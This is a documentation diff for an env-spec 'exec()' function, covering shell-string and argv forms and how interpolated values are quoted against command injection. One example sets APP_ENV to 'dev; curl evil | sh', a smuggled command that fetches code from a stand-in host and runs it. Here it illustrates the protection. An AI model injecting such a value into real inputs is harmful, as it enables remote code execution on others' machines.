@@ -77,6 +77,21 @@ API_KEY=exec(`my-secrets-cli get api-key`)
 # Any command whose stdout becomes the value
 GIT_SHA=exec(`git rev-parse HEAD`)
 ```
+
+**Two forms.** With a single argument, the string runs through the shell (`/bin/sh -c`, or `cmd.exe` on Windows), so pipes, `&&`, redirects and globs in the text you wrote all work. With two or more arguments, the program runs directly with no shell: the first argument is the program, the rest are passed to it one argument each.
+
+```env-spec "exec"
+# string form: shell syntax in the static text is yours to use
+TOKEN=exec(`my-cli token --json | jq -r .value`)
+# argv form: no shell, each argument is exactly one argument to the program
+CONFIG=exec("./scripts/load-config.sh", "--env", $APP_ENV)
+```
+
+**Interpolated values are arguments, not shell.** In the string form, a value you interpolate (`${APP_ENV}`, or a nested function call) is quoted so the shell sees it as a single word, whatever it contains. ``exec(`./load-config.sh ${APP_ENV}`)`` with `APP_ENV` set to `dev; curl evil | sh` runs `./load-config.sh 'dev; curl evil | sh'`: one argument, no second command. This matters because `APP_ENV` can come from the process environment or a `.env.local`, not only from your schema. Only the static text you wrote is parsed as shell. A wholly dynamic command (`exec($CMD)`) is the one exception: there the whole value is the command, as written.
+
+If you need an interpolated value split into several arguments, or on Windows (where `cmd.exe` quoting is best effort and `%NAME%` still expands inside quotes), use the argv form.
+
+When a command fails, the error shows the command as written in the schema and the exit code and stderr, not the interpolated values, so a secret passed as an argument stays out of the output.
 </div>
 
 <div>
